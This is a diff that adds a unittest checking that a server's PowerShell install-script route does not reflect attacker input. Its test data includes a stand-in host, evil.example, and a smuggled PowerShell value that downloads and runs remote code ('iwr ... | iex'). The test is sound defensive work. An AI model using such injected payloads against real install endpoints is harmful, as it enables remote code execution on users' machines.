@@ -94,6 +94,18 @@ class TestServer(unittest.TestCase):
         _, zipb = self._get("/download/agent.zip")
         self.assertEqual(zipb[:2], b"PK")  # zip magic number
 
+    def test_install_ignores_attacker_server_param(self):
+        # SECURITY: a crafted ?server= must NOT be reflected into the script. The installer
+        # downloads + runs an .exe from $Server, so honoring it would be phishing-to-RCE.
+        _, script = self._get("/install.ps1?server=http://evil.example&code=deadbeef")
+        self.assertNotIn(b"evil.example", script)          # attacker host never appears
+        self.assertIn(b"127.0.0.1", script)                # our own origin is baked in
+        self.assertIn(b"deadbeef", script)                 # valid hex code preserved
+        # a non-hex (injection-y) code is dropped, not reflected
+        _, script2 = self._get("/install.ps1?code=';iwr%20http://evil/x|iex;%23")
+        self.assertNotIn(b"evil", script2)
+        self.assertNotIn(b"iex;", script2)
+
     def test_agent_exe_route(self):
         import urllib.error
         from server import api as _api
